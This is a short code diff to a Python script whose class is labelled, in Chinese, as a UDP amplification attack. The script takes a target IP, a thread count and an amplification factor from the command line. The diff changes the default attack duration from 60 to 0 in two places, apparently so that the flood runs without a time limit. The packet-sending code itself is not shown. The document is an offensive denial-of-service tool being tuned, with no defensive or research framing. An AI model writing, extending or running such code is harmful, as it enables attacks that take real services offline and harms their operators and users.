@@ -14,7 +14,7 @@ class UDPAmplificationAttack:
     """UDP放大攻击类"""
     
     def __init__(self, target_ip, target_port=9999, num_threads=50, 
-                 duration=60, amplification_factor=100):
+                 duration=0, amplification_factor=100):
         self.target_ip = target_ip
         self.target_port = target_port
         self.num_threads = num_threads
@@ -147,7 +147,7 @@ def main():
     
     target_ip = sys.argv[1]
     num_threads = int(sys.argv[2]) if len(sys.argv) > 2 else 50
-    duration = int(sys.argv[3]) if len(sys.argv) > 3 else 60
+    duration = int(sys.argv[3]) if len(sys.argv) > 3 else 0
     amplification = int(sys.argv[4]) if len(sys.argv) > 4 else 100
     
     attack = UDPAmplificationAttack(
